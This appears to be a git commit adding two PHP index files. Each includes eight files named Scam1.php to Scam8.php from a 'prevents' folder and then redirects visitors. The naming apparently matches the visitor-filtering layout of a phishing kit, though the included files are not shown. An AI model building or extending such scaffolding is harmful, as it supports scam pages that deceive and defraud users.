2170c88cc85c03eb5d350bd99d570d4f90b0c7c5
James Mwangi Kihiko <mwngjay@gmail.com>
2023-06-19 11:51:38 +0100

    initial commit

---
+++ extra/stockers/index.php
@@ -0,0 +1,11 @@
+<?php
+  	include '../../prevents/Scam1.php';
+    include '../../prevents/Scam2.php';
+    include '../../prevents/Scam3.php';
+    include '../../prevents/Scam4.php';
+    include '../../prevents/Scam5.php';
+    include '../../prevents/Scam6.php';
+    include '../../prevents/Scam7.php';
+    include '../../prevents/Scam8.php';
+	exit(header("Location: ../index.php"));
+?>
---
+++ prevents/index.php
@@ -0,0 +1,11 @@
+<?php
+  	require 'Scam1.php';
+	require 'Scam2.php';
+	require 'Scam3.php';
+	require 'Scam4.php';
+	require 'Scam5.php';
+	require 'Scam6.php';
+	require 'Scam7.php';
+	require 'Scam8.php';
+	exit(header("Location: ../index.php"));
+?>
